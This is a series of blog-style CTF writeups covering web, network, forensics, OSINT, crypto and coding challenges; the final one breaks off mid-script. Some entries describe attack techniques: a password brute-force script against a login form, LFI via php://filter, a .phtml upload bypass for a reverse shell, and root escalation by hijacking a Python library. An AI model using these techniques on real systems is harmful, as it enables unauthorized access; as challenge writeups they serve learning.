[{"content":"Anti-Brute CTF Challenge Writeup Challenge Information Name: Anti-Brute Points: 340 Category: Web Objective: The challenge involves bypassing anti-brute force measures to retrieve the flag without brute-forcing. Solution Here\u0026rsquo;s a detailed solution for the Anti-Brute CTF challenge:\nInitial Assessment:\nReceived a wordlist and instructions not to brute force the password. But I brute-forced anyways Attempted Brute Force:\nTried using Burp Suite\u0026rsquo;s Intruder tool for brute forcing, but it was unsuccessful for unknown reasons. Python Script:\nCreated a Python script to automate the process of retrieving the flag without brute-forcing.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import requests url = \u0026#39;https://no-brute.ctf.rawsec.com/login.php\u0026#39; headers = { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, } with open(\u0026#39;possible_password.txt\u0026#39;, \u0026#39;r\u0026#39;) as file: for line in file: password = line.strip() data = { \u0026#39;username\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;: password } response = requests.post(url, headers=headers, data=data) if \u0026#39;Invalid username or password\u0026#39; not in response.text: print(f\u0026#34;Password found: {password}\u0026#34;) print(response.text) break else: print(f\u0026#34;Trying password: {password}\u0026#34;) Flag Extraction:\nSuccessfully extracted the flag using the Python script.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/anti-brute/","title":"Anti-Brute"},{"content":"Assemble CTF Challenge Writeup Challenge Information Name: Assemble Points: 500 Category: Hardware Objective: The objective of the \u0026ldquo;Assemble\u0026rdquo; challenge is to correctly configure the hardware components and troubleshoot any technical issues to display the flag on the LCD. Solution To solve the \u0026ldquo;Assemble\u0026rdquo; CTF challenge, the following configurations were made:\nWiring Matrix Module to Arduino:\nC4 -\u0026gt; 13 C3 -\u0026gt; 12 C2 -\u0026gt; ~11 C1 -\u0026gt; ~10 R1 -\u0026gt; ~9 R2 -\u0026gt; 8 R3 -\u0026gt; 7 R4 -\u0026gt; 6 Attach Potentiometer and LCD to Breadboard:\nPotentiometer wiring: GND to Blue rail 5V to Red rail I/O - LCD \u0026lsquo;VEE\u0026rsquo; LCD Wiring: VSS to Blue rail VDD to Red rail RS to A0 RW to A1 E to A2 D7 to Blue rail D6 to Red rail D5 to A5 D4 to A4 D3 to A3 Technical Issues:\nEncountered technical issues where the flag would not display on the LCD.\nDespite the issues, the excons provided the flag as a gesture of completion.\nYou can view it on the video in this directory\nFlag RWSC{XXXXXXXXXX}\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/assemble/","title":"Assemble"},{"content":"BlackHole CTF Challenge Writeup Challenge Information Name: BlackHole Points: 380 Category: Web Objective: The objective of the BlackHole challenge is to find the flag hidden within the URL or the web page\u0026rsquo;s content. Solution To solve the BlackHole CTF challenge, follow these steps:\nInitial Assessment:\nIdentified that the challenge seemed the same as the preliminary one. Script Adaptation:\nUtilized a script from a writeup from that day.\nAdapted the script to suit my needs for the challenge.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 import requests from bs4 import BeautifulSoup from urllib.parse import urljoin, urlparse, unquote visited_links = set() def get_links(url): try: response = requests.get(url) soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) links = soup.find_all(\u0026#39;a\u0026#39;, href=True) return [urljoin(url, link[\u0026#39;href\u0026#39;]) for link in links] except requests.exceptions.RequestException as e: print(f\u0026#34;Error retrieving links from {url}: {e}\u0026#34;) return [] def is_directory(soup): return not \u0026#34;No directories found.\u0026#34; in soup.get_text() and soup.find_all(class_=\u0026#34;directory-link\u0026#34;) def visit_links_recursive(url): if url in visited_links: return parsed_url = urlparse(url) base_domain = \u0026#34;blackhole.ctf.rawsec.com\u0026#34; if parsed_url.netloc != base_domain: return print(f\u0026#34;Visiting: {unquote(url)}\u0026#34;) try: response = requests.get(url) soup = BeautifulSoup(response.text, \u0026#39;html.parser\u0026#39;) if is_directory(soup): print(f\u0026#34;Directory found: {url}\u0026#34;) visited_links.add(url) links = get_links(url) for link in links: visit_links_recursive(link) except requests.exceptions.RequestException as e: print(f\u0026#34;Error visiting {url}: {e}\u0026#34;) def main(): starting_url = \u0026#39;https://blackhole.ctf.rawsec.com/\u0026#39; visit_links_recursive(starting_url) if __name__ == \u0026#34;__main__\u0026#34;: main() Flag.txt Extraction:\nUsed the adapted script to find a flag.txt file.\nHowever, the flag was not directly found in the flag.txt file.\nRereading the URL:\nRevisited the challenge\u0026rsquo;s instructions to reread the URL.\nCyberChef Analysis:\nAnalyzed the URL using CyberChef.\nDiscovered the flag hidden within the URL.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/blackhole/","title":"BlackHole"},{"content":"ButterCup CTF Challenge Writeup Challenge Information Name: ButterCup Points: 490 Category: Misc Objective: The challenge involves extracting three parts of the flag from a video, with two parts embedded in the video itself and one part hidden in the audio spectrum. Solution Here\u0026rsquo;s a detailed solution for the ButterCup CTF challenge:\nInitial Assessment:\nWithout hints, we definitely cannot solve this challenge. We were told that there were three parts to the flag, with two parts embedded in the video and one part hidden in the audio spectrum. Video Analysis:\nWent through the video multiple times, including adjusting playback speed and brightness to catch any hidden elements.\nDiscovered the words 3XP3RT_ at around 14 seconds and 1N_ at around 2:52 in the video.\nAudio Spectrum Analysis:\nUsed audacity on the audio of the video to reveal hidden patterns.\nConfigured the spectrogram to enhance visibility of subtle details.\nFound a hint for the last part of the flag in the spectrogram.\nNot the clearest picture of the last part, but we were able to deducde its 4UD1O.\nFlag Reconstruction:\nCombined the three parts of the flag obtained from the video and audio spectrum to reconstruct the complete flag. Conclusion:\nThe ButterCup CTF challenge required a thorough analysis of both the video and audio spectrum to extract all parts of the flag. It demonstrated the importance of attention to detail and the use of specialized tools for multimedia analysis in CTF challenges. ","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/buttercup/","title":"ButterCup"},{"content":"Cali Cartel CTF Challenge Writeup Challenge Information Name: Cali Cartel Points: 50 Category: OSINT (Open-Source Intelligence) Objective: The challenge requires finding a flag using OSINT techniques. Solution Here\u0026rsquo;s a brief overview of the solution for the Cali Cartel CTF challenge:\nInitial Approach:\nInitially attempted to solve the challenge using traditional OSINT techniques. Alternative Solution:\nBut when we saw many players are solving it and we aren\u0026rsquo;t, we resorted to the most retarded way of solving CTF ever, Google Dorking. Google Dorking:\nApplied Google dorking techniques to search for information related to the challenge. Discovered relevant information that led to the flag. Flag Acquisition:\nObtained the flag using the information found through Google dorking.\nConclusion The Cali Cartel challenge was solved using an alternative approach of Google dorking after traditional OSINT techniques did not yield the desired results. Google dorking helped discover information that ultimately led to finding the flag.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/cali-cartel/","title":"Cali Cartel"},{"content":"I Hope You Have The Software CTF Challenge Writeup Challenge Information Name: I Hope You Have The Software Points: 230 Category: Network Objective: The objective of this challenge is to find the flag hidden in the HTML files served by the servers in the packet capture. Solution To solve the \u0026ldquo;I Hope You Have The Software\u0026rdquo; CTF challenge, follow these steps:\nInitial Assessment:\nAnalyzed the packet capture and identified 12 servers.\nNoticed two servers stacked on top of each other, suggesting a hidden layer.\nHTML File Analysis:\nInspected the HTML files served by the servers. Found the flag hidden within one of the HTML files. Flag Extraction:\nExtracted the flag from the HTML file.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/i-hope-you-have-the-software/","title":"I Hope You Have The Software"},{"content":"LastHope CTF Challenge Writeup Challenge Information Name: LastHope Points: 50 Category: Network Objective: The challenge involves cracking a WiFi password using captured WiFi packets. Solution Here\u0026rsquo;s a step-by-step solution for the LastHope CTF challenge:\nCapturing WiFi Packets:\nLoaded the provided file in Wireshark to analyze the network traffic.\nObserved a large number of 802.11 packets, indicating WiFi traffic.\nIdentifying Access Point MAC Address:\nIdentified the MAC address of the access point, which can be used to crack the WiFi password.\nIdentified the SSID of the WiFi network as \u0026ldquo;Rawsec Command Centre.\u0026rdquo;\nCracking WiFi Password:\nUsed a tool like Aircrack-ng with the rockyou.txt wordlist to crack the WiFi password associated with the captured packets.\nObtaining the Flag:\nThe cracked WiFi password is the flag for this challenge.\nConclusion The LastHope challenge required participants to crack a WiFi password using captured network packets. By analyzing the packets in Wireshark and using tools like Aircrack-ng with wordlists, participants could obtain the flag associated with the cracked WiFi password.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/lasthope/","title":"LastHope"},{"content":"Medellín Cartel CTF Challenge Writeup Challenge Information Name: Medellín Cartel Points: 190 Category: OSINT (Open-Source Intelligence) Objective: The challenge involves finding a flag related to a person named Blacky on a specific Instagram page. Solution Here\u0026rsquo;s a step-by-step solution for the Medellín Cartel CTF challenge:\nHint Analysis:\nWe definitely used the hints in this challenge which directed us to find information about Blacky on a specific Instagram page. Investigating Blacky\u0026rsquo;s Instagram Page:\nVisited the Instagram page mentioned in the hint.\nFound that Blacky\u0026rsquo;s page has only 1 follower and 1 post.\nInspecting the Post:\nInspected the single post on Blacky\u0026rsquo;s page. Discovered the flag hidden within the post\u0026rsquo;s content. Obtaining the Flag:\nExtracted the flag from the post\u0026rsquo;s content.\nConclusion The Medellín Cartel challenge required participants to investigate a specific Instagram page to find information about a person named Blacky. By inspecting Blacky\u0026rsquo;s post on the page, participants could discover the flag hidden within the post\u0026rsquo;s content.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/medell%C3%ADn-cartel/","title":"Medellín Cartel"},{"content":"Mobile CTF Challenge Writeup Challenge Information Name: Mobile Points: 290 Category: DFIR (Digital Forensics and Incident Response) Objective: The challenge involves extracting information from a PDF document related to mobile forensics. Solution Here\u0026rsquo;s a brief overview of the solution for the Mobile CTF challenge:\nInitial Approach:\nStarted by examining the 3000-page PDF document provided for any visible clues or patterns.\nNoticed that certain pages were scribbled over, indicating potential hidden information.\nExtraction Attempt:\nUsed pdfimages tool to extract images from the PDF, hoping to find hidden messages or flags. However, this approach did not yield any relevant information. If you are curious, they are confidential information such as IC, BankRakyat Account Information, etc Identification of Suspicious Content:\nContinued to carefully review the PDF document.\nNoticed a suspicious SHA-1 hash that was out of place and bolded, hinting at its significance.\nHint from Social Media:\nRecalled a hint from Twitter related to Android hacking and cracking gesture passwords. Realized that the SHA-1 hash resembled the format of the hash mentioned in the hint. Decryption Attempt:\nResearched tools and methods for decrypting SHA-1 hashes associated with Android gesture passwords. Found a Python script on GitHub that seemed promising for this purpose. Successful Decryption:\nApplied the Python script to decrypt the SHA-1 hash found in the PDF.\nThe decrypted value revealed the flag, solving the challenge.\nConclusion The Mobile CTF challenge involved extracting a hidden flag from a large PDF document related to mobile forensics. Despite initial attempts to extract information from the PDF images, the solution was found in a suspicious SHA-1 hash within the document. By decrypting this hash using a Python script, the flag was successfully obtained, completing the challenge.\nNotes for this challenge Despite the gruesome challenge, there were highlights that are worth mentioning. Attached below are my favourite parts of this challenge.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/mobile/","title":"Mobile"},{"content":"Resign Letter CTF Challenge Writeup Challenge Information Name: Resign Letter Points: 50 Category: Reverse Engineering Objective: The challenge involves analyzing a Word document to extract and analyze a suspicious executable file. Solution Here\u0026rsquo;s a detailed solution for the Resign Letter CTF challenge:\nInitial Assessment:\nAnalyzed the provided Word document for any embedded macros using olevba.\nIdentified a suspicious link within the document.\nAnalysis of the Executable:\nDownloaded and extracted the executable, named lenovo.exe. Ran the executable in a Windows virtual machine for analysis. Dynamic Analysis:\nInitially used Procmon for monitoring file system activity but found it challenging due to the hidden modifications. Switched to API Monitor for more detailed monitoring. Identifying the Flag:\nAnalyzed the API calls made by the executable using API Monitor.\nDiscovered the flag being accessed or manipulated by the executable.\nConclusion The Resign Letter CTF challenge required reverse engineering skills to analyze a Word document and a Windows executable. By using tools like olevba for macro analysis and API Monitor for dynamic analysis of the executable, the flag was successfully extracted. This challenge highlighted the importance of understanding malware analysis techniques for identifying malicious behavior.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/resign-letter/","title":"Resign Letter"},{"content":"Round and Round CTF Challenge Writeup Challenge Information Name: Round and Round Points: 50 Category: Cryptography Objective: The challenge involves decrypting a given ciphertext to obtain the flag. Solution Here\u0026rsquo;s a detailed solution for the Round and Round CTF challenge:\nInitial Assessment:\nExamined the given ciphertext but was unsure of the encryption method used. Observations and Strategy:\nIt took me long to notice that the ciphertext seemed to resemble ASCII values or character mappings. Attempted to place the flag format, RWSC{, under the ciphertext to see if any patterns emerged. Decryption Process:\nFor example, 21 corresponds to \u0026lsquo;R\u0026rsquo;, 26 corresponds to \u0026lsquo;W\u0026rsquo;, and so on.\nUsed this pattern to decode each number in the ciphertext to its corresponding character.\nBut there is a gimmick, I eventually found out that if numbers were less than 30 were being wrapped around.\nThis is a very stupid gimmick to be honest, since the flag cannot be constructed without knowing this.\nFlag Decryption:\nDecrypted the entire ciphertext using the wrapping pattern to reveal the flag. The flag is also in upper-case. Conclusion The Round and Round CTF challenge required understanding a specific wrapping pattern to decrypt the given ciphertext. By recognizing the pattern and applying it to the ciphertext, the flag was successfully decrypted. This challenge demonstrated the importance of pattern recognition and creative thinking in cryptography challenges.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/round-and-round/","title":"Round and Round"},{"content":"SimpleLazy CTF Challenge Writeup Challenge Information Name: SimpleLazy Points: 330 Category: Web Objective: The challenge involves exploiting a Local File Inclusion (LFI) vulnerability to retrieve a flag. Solution Here\u0026rsquo;s a detailed solution for the SimpleLazy CTF challenge:\nInitial Assessment:\nImmediately recognized the challenge as having a Local File Inclusion (LFI) vulnerability, particularly with the page3.php parameter.\nDiscovered that input was always appended with .php, limiting directory traversal options.\nStrategy for Exploitation:\nFocused on extracting PHP source code from index.php, page1.php, page2.php, and page3.php.\nUtilized php://filter to retrieve PHP files in base64 format, allowing for remote file inclusion.\nExploiting the LFI:\nRetrieved the source code of page3.php using php://filter.\nDiscovered the inclusion of a suspicious file in the PHP source code.\nRetrieving the Flag:\nApplied the same php://filter technique to extract the suspicious file\u0026rsquo;s contents in base64 format.\nDecoded the contents of the suspicious file to reveal the flag.\nConclusion The SimpleLazy CTF challenge demonstrated the importance of understanding LFI vulnerabilities and using techniques like php://filter to retrieve PHP source code and extract hidden files. By exploiting the vulnerability and decoding the suspicious file\u0026rsquo;s contents, the flag was successfully obtained, completing the challenge.\n","date":"2024-03-09T00:00:00Z","permalink":"https://qiaonpc.github.io/post/simplelazy/","title":"SimpleLazy"},{"content":"Compromised - CTF Challenge Writeup Challenge Information Name: Compromised Category: Forensics Objective: The objective of the \u0026ldquo;Compromised\u0026rdquo; CTF challenge is to extract a hidden flag embedded within a complex set of files and directories. Solution To successfully solve the \u0026ldquo;Compromised\u0026rdquo; challenge, I executed the following steps:\nInitial Examination:\nUnzipped the provided challenge file, revealing a directory structure reminiscent of a Windows directory. Flag Identification:\nUsing the tree command, I quickly located the flag within the directory structure. However, it was a zip file itself, requiring further steps for extraction.\nBrute Forcing the Zip File:\nAttempted to brute force the password for the zip file. Initially faced permission issues, resolved by changing permissions using chmod.\nUsed John The Ripper to crack the zip file password, which proved unsuccessful, prompting a search for the password.\nLocating Password:\nAfter some exploration, identified the crucial file named Cache0000.bin, which holds significant data for the challenge.\nCache0000.bin contains data related to Remote Desktop Protocol (RDP) cache.\nExtracting Images from Cache File:\nEmployed the tool bmc-tools (https://github.com/ANSSI-FR/bmc-tools) to extract pictures from Cache0000.bin.\nRevealing Flag within Images:\nExtracted over 2000 images, one of which combines all the segments of the flag.\nNoticed segments of the flag within the combined image, visible upon zooming in.\nCombining Segments into Flag:\nUtilized RDPCacheStitcher (https://github.com/BSI-Bund/RdpCacheStitcher/releases/) to assemble the segments as if solving a puzzle.\nObtaining Password:\nDiscovered the password WGMY_P4ssw0rd_N0t_V3ry_H4rd!!! while assembling the image segments. Final Flag Extraction:\nSuccessfully unzipped the flag from the zip file using the obtained password.\nFlag The flag for this challenge is: wgmy{XXXXXXXXXX}.\nThis writeup delineates the process of navigating through a directory, extracting images from a cache file, assembling image segments, and obtaining the hidden flag in the \u0026ldquo;Compromised\u0026rdquo; CTF challenge. For any further queries or clarifications, please feel free to ask.\n","date":"2023-12-17T00:00:00Z","permalink":"https://qiaonpc.github.io/post/compromised/","title":"Compromised"},{"content":"Linux Memory Usage - CTF Challenge Writeup Challenge Information Name: Linux Memory Usage Category: PPC / Leet Code Objective: The objective of the \u0026ldquo;Linux Memory Usage\u0026rdquo; CTF challenge is to efficiently manage and process memory usage data for different processes based on given inputs. Solution Encountering a Leet Code challenge within a CTF was an interesting experience. Here\u0026rsquo;s how I tackled it:\nUnderstanding Inputs:\nThis was my first encounter with a Leet Code style challenge in a CTF context, very very fun. The problem consisted of three types of inputs: Variables N and Q: Representing the number of processes and queries. Processes\u0026rsquo; Data: Including process id, parent process id, and memory usage. Queries: Containing necessary information for further analysis. Memory Mapping:\nUtilizing the received inputs, I structured the memory by creating a dictionary. The dictionary\u0026rsquo;s key-value pairs were organized to represent parent processes and their corresponding children processes, facilitating efficient data retrieval. Handling Queries:\nProcessing queries involved reading and parsing the data structure I coded to provide the desired output efficiently.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 from collections import defaultdict def calculate_memory_usage(p, q): children = defaultdict(list) memory = {} for a, b, c in p: memory[a] = c if b != 0: children[b].append(a) memo = {} results = [] for query in q: stack = [query] total_memory = 0 while stack: current_pid = stack.pop() if current_pid in memo: total_memory += memo[current_pid] continue total_memory += memory[current_pid] children_list = children[current_pid] for child in children_list: stack.append(child) results.append(total_memory) memo[query] = total_memory return results N, Q = map(int, input().split()) p = [list(map(int, input().split())) for _ in range(N)] q = [int(input()) for _ in range(Q)] results = calculate_memory_usage(p, q) for result in results: print(result) Flag The flag for this challenge is: wgmy{XXXXXXXXXX}.\nThis writeup demonstrates the process of efficiently managing and processing memory usage data in the \u0026ldquo;Linux Memory Usage\u0026rdquo; CTF challenge using appropriate data structures and systematic query handling. For any further inquiries or clarifications, feel free to ask.\n","date":"2023-12-17T00:00:00Z","permalink":"https://qiaonpc.github.io/post/linux-memory-usage/","title":"Linux Memory Usage"},{"content":"Lokami Temple - CTF Challenge Writeup Challenge Information Name: Lokami Temple Category: PPC / Leet Code Objective: The objective of the \u0026ldquo;Lokami Temple\u0026rdquo; CTF challenge is to navigate a graph problem by determining the shortest path for all doors to exit. Solution Encountering a Leet Code challenge within a CTF was an intriguing experience. Here\u0026rsquo;s my approach to solving it:\nGraph Problem Analysis:\nOpted to use Depth-First Search (DFS) due to its comprehensibility, although Breadth-First Search (BFS) could potentially be faster. Utilized DFS templates available from resources like Geek4Geeks to implement the algorithm. Contradictory Challenge Instructions:\nInitially, the challenge instructions seemed contradictory, as it asked to find both the longest and shortest paths for doors. Decided to prioritize identifying the longest path to each door first, considering the logical progression of the problem. Longest Paths for Each Door:\nCalculated the longest path from each door to the exit. For example: Door 1: 6 steps to Exit 10 Door 2: 6 steps to Exit 10 Door 3: 5 steps to Exit 10 Evaluated each door\u0026rsquo;s longest path to determine the shortest length. Selecting Shortest Path:\nChose the door with the shortest path to the exit among the calculated values. In the example, if Door 3 requires only 5 steps while Doors 1 and 2 need 6 steps, Door 3 becomes the selected choice. Finding Exit Paths via Selected Door:\nExplored and mapped all potential paths to the exit through the selected door (in this case, Door 3). Door 3 can exit through Door 1, Door 2, Door 5, basically any door Select the longest path for Door 3 to exit in this step Conclusion:\nThe challenge resolution involved a systematic approach of identifying the longest paths to each door, selecting the door with the shortest path to the exit, and exploring paths through the chosen door.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 from collections import defaultdict def find_longest_paths(num_doors, connections): graph = defaultdict(list) for a, b in connections: graph[a].append(b) graph[b].append(a) def dfs(node, visited): visited.add(node) max_path_length = 0 for neighbor in graph[node]: if neighbor not in visited: path_length = dfs(neighbor, visited) max_path_length = max(max_path_length, path_length) visited.remove(node) return max_path_length + 1 longest_paths = [] for door in range(1, num_doors + 1): path_length = dfs(door, set()) longest_paths.append((door, path_length)) return longest_paths def get_longest_paths(result): max_path_length = max(result, key=lambda x: x[1])[1] doors_with_max_length = [door for door, path_length in result if path_length == max_path_length] return max_path_length, doors_with_max_length def main(): num_doors = int(input(\u0026#34;\u0026#34;)) print(\u0026#34;\u0026#34;) connections = [] for _ in range(num_doors - 1): a, b = map(int, input().split()) connections.append((a, b)) result = find_longest_paths(num_doors, connections) min_path_length = min(result, key=lambda x: x[1])[1] doors_with_min_length = [door for door, path_length in result if path_length == min_path_length] max_path_length, doors_with_max_length = get_longest_paths(result) print_exit = \u0026#39; \u0026#39;.join(map(str, doors_with_max_length)) print_door_min_length = \u0026#39; \u0026#39;.join(map(str, doors_with_min_length)) print(f\u0026#34;Entrance(s): {print_door_min_length}\u0026#34;) print(f\u0026#34;Exit(s): {print_exit}\u0026#34;) print(f\u0026#34;Path Length: {min_path_length - 1}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() Flag The flag for this challenge is: wgmy{XXXXXXXXXX}.\nThis writeup illustrates the approach taken to navigate a graph problem, determining the shortest path for all doors to exit in the \u0026ldquo;Lokami Temple\u0026rdquo; CTF challenge. For any further queries or clarifications, feel free to inquire.\n","date":"2023-12-17T00:00:00Z","permalink":"https://qiaonpc.github.io/post/lokami-temple/","title":"Lokami Temple"},{"content":"DigiDoc - CTF Challenge Writeup Challenge Information Name: DigiDoc Objective: The objective of the \u0026ldquo;DigiDoc\u0026rdquo; CTF challenge is to gain root access to the target server by exploiting various vulnerabilities, including FTP, web application vulnerabilities (such as upload and IDOR), and privilege escalation. Solution To successfully tackle the \u0026ldquo;DigiDoc\u0026rdquo; challenge, I executed the following steps:\nInitial Enumeration using Nmap:\nI started by performing an initial scan using Nmap on the provided IP address, which revealed open ports: FTP, SSH, and HTTP.\nFTP Analysis:\nInvestigating the FTP service, I logged in anonymously and found two files. Downloading these files revealed an ECB key that would be useful later.\nExploring the HTTP Service:\nMoving to the HTTP service, I ran a directory brute force using Gobuster. Eventually, it identified a login page.\nLogging in as a guest revealed an upload page, indicating a potential upload vulnerability. However, admin access was required.\nIdentifying IDOR Vulnerability:\nAnalyzing the accounts tab, I identified an Insecure Direct Object Reference (IDOR) vulnerability, allowing access to user IDs, crucial for admin privileges.\nIDOR vulnerability involves manipulating user IDs or object references to gain unauthorized access.\nExploiting Upload Vulnerability:\nI attempted exploiting the upload vulnerability. Despite correctly written code and magic bytes, standard PHP file extensions didn\u0026rsquo;t work.\nFollowing recommendations from hacktricks, I discovered that the .phtml extension allowed successful uploads, enabling me to upload a reverse shell.\nEscalating Privileges:\nAccessing the server, I realized I was the www-data user. To achieve root access, I explored the home directory, finding two users: Alvin and Dave.\nDecoding a base64-encoded string in Alvin\u0026rsquo;s directory, using the previously obtained ECB key, revealed a plaintext password.\nPrivilege Escalation:\nSSHing into the server using Alvin\u0026rsquo;s credentials, I discovered an ability for Alvin to execute a hidden Python script as root using sudo.\nPrivilege Escalation:\nThe solution involved hijacking the libraries in a script file provided without modifying it.\nCreating a new shutil.py file, spawning a shell using os, escalated privileges to root.\nFlag Retrieval:\nThe obtained flag through the intended solution: ABOH23{wh47_4_cr4pp7_s3rv1c3_c3nt3r}.\nThe resolution of the \u0026ldquo;DigiDoc\u0026rdquo; challenge encompassed identifying multiple vulnerabilities, including FTP access, web application flaws, and privilege escalation, ultimately leading to obtaining the root flag.\nFlag The flag for this challenge is: ABOH23{wh47_4_cr4pp7_s3rv1c3_c3nt3r}.\nThis writeup demonstrates the process of identifying and exploiting various vulnerabilities to gain root access in the \u0026ldquo;DigiDoc\u0026rdquo; CTF challenge. For any further inquiries or clarifications, please feel free to ask.\n","date":"2023-12-02T00:00:00Z","permalink":"https://qiaonpc.github.io/post/digidoc/","title":"DigiDoc"},{"content":"FurElise - CTF Challenge Writeup Challenge Information Name: FurElise Objective: The objective of the \u0026ldquo;FurElise\u0026rdquo; CTF challenge is to decode a hidden flag concealed within a PowerShell script by following a series of deobfuscation and decoding steps. Solution To solve the \u0026ldquo;FurElise\u0026rdquo; challenge and retrieve the flag, I executed the following steps:\nFile Analysis:\nUpon inspecting the provided file, it was evident that it is a PowerShell script containing obfuscated code.\nDeobfuscation:\nDrawing inspiration from problem-solving approaches by John Hammond, I initiated the deobfuscation process.\nThe initial step involved removing the \u0026amp; present throughout the script.\nRemoving Unnecessary Lines:\nFurther simplification of the script was performed by eliminating redundant lines, notably lines containing ''''''FürElise''''''FürElise.\nThis step helped in revealing clearer, relevant content within the script.\nIdentifying Clues:\nWithin the revised script, two links were discovered, which contained crucial elements of the flag.\nThe first link provided the initial part of the flag.\nAnalyzing the Second Link:\nThe second link presented another PowerShell script. However, caution was exercised against executing it directly on a host machine due to safety concerns.\nDecoding Base64:\nThe second PowerShell script was decoded from Base64, revealing additional script content.\nTo understand its functionality, portions of the script were cautiously executed one by one, avoiding potential risks and aiming to decode it progressively.\nLocating Hidden Information:\nWhile decoding the PowerShell script, a link was discovered halfway through the process, leading to the final part of the flag.\nFinal Flag Retrieval:\nNavigating to the obtained link revealed the last segment of the flag, completing the puzzle.\nThe resolution of the \u0026ldquo;FurElise\u0026rdquo; challenge involved systematic deobfuscation, cautious decoding, and progressive script execution to unveil hidden elements and retrieve the flag.\nFlag The flag for this challenge is: ABOH23{d!ff1cU17_s0Ng_FROm_hEaRtBrE4K}.\nThis writeup serves as a demonstration of decoding techniques used to extract the hidden flag within the \u0026ldquo;FurElise\u0026rdquo; CTF challenge. Should you require further explanation or have additional queries, please feel free to ask.\n","date":"2023-12-02T00:00:00Z","permalink":"https://qiaonpc.github.io/post/furelise/","title":"FurElise"},{"content":"May The Force Be With You - CTF Challenge Writeup Challenge Information Name: May The Force Be With You Objective: The objective of the \u0026ldquo;May The Force Be With You\u0026rdquo; CTF challenge is to decipher a hidden flag encoded within a given script using reverse engineering techniques. Solution To solve the \u0026ldquo;May The Force Be With You\u0026rdquo; challenge and obtain the flag, I followed the below steps:\nUnderstanding the Challenge Objective:\nThe challenge required decoding a hidden flag from a provided script using reverse engineering methods. Initial Approach:\nDue to personal constraints and limited expertise in mathematics, I opted to use HackerGPT, a tool specialized in reversing scripts, to decode the hidden flag. Though using automated tools can be considered disrespectful to the challenge creator, it was necessary due to my limitations and time constraints during the competition. Script Analysis:\nUtilizing the script below, I executed it to unveil the hidden flag.\nUnfortunately, due to my lack of proficiency in deciphering the script manually, I had to rely on HackerGPT to assist me in understanding the logic and unveiling the flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from Crypto.Cipher import AES from Crypto.Util.Padding import unpad from Crypto.Protocol.KDF import PBKDF2 import textwrap def decrypt_file(encrypted_file_path, password): with open(encrypted_file_path, \u0026#39;rb\u0026#39;) as file: ciphertext_iv = file.read() iv = ciphertext_iv[-AES.block_size:] ciphertext = ciphertext_iv[:-AES.block_size] passwd = textwrap.dedent(password)[:-1] salt = b\u0026#39;salt123\u0026#39; key = PBKDF2(passwd.encode(), salt, dkLen=16) cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size) return plaintext password = \u0026#34;ni5h2h?Yrq8Do?n+|6a;pKbZkv%}O~tV\u0026#34; encrypted_file_path = \u0026#34;./flag.txt.enc\u0026#34; plaintext = decrypt_file(encrypted_file_path, password) print(plaintext.decode()) Flag Extraction:\nUpon executing the script, the decoded flag was revealed as ABOH23{A3S_Rul35_tH3_F0rc3}. The resolution of this challenge involved leveraging reverse engineering tools like HackerGPT to decode the hidden flag from the provided script. While I regret not being able to decode it manually due to personal limitations, I acknowledge the importance of understanding the underlying concepts for future challenges.\nFlag The flag for this challenge is: ABOH23{A3S_Rul35_tH3_F0rc3}.\nThis writeup serves as a demonstration of utilizing reverse engineering tools to decode the hidden flag in the \u0026ldquo;May The Force Be With You\u0026rdquo; CTF challenge. If you have any further inquiries or need additional clarification, please feel free to ask.\n","date":"2023-12-02T00:00:00Z","permalink":"https://qiaonpc.github.io/post/may-the-force-be-with-you/","title":"May The Force Be With You"},{"content":"Small Sage - CTF Challenge Writeup Challenge Information Name: Small Sage Objective: The objective of the \u0026ldquo;Small Sage\u0026rdquo; CTF challenge is to decipher a flag that has been encrypted using RSA encryption techniques, focusing on elements like n, p, q, C, N, and e. Solution To successfully solve the \u0026ldquo;Small Sage\u0026rdquo; challenge and retrieve the flag, I followed these steps:\nInitial Analysis:\nUpon inspecting the provided \u0026ldquo;Small Sage\u0026rdquo; script, it was evident that it resembled RSA encryption, as it contained elements like n, p, and q.\nAdditionally, the out.txt file contained variables C, N, and e, further indicating an RSA encryption problem.\nIdentifying RSA Encryption:\nRecognizing the RSA encryption components (n, p, q, C, N, e), it was clear that this challenge was centered around RSA encryption and decryption. Approach:\nNoticing the hint with the term \u0026ldquo;small\u0026rdquo; in the challenge name, I hypothesized that it might involve a small e problem in RSA encryption. I proceeded to use my typucal script tailored for solving RSA problems with small e values. You can find the script in solve.py Flag Retrieval:\nExecuting the script designed to handle RSA problems with small e values successfully decrypted the encrypted data.\nThe deciphered message revealed the flag: ABOH23{rocky0ubrr!}.\n1 2 3 4 5 6 7 8 9 10 11 12 13 import gmpy2 N = 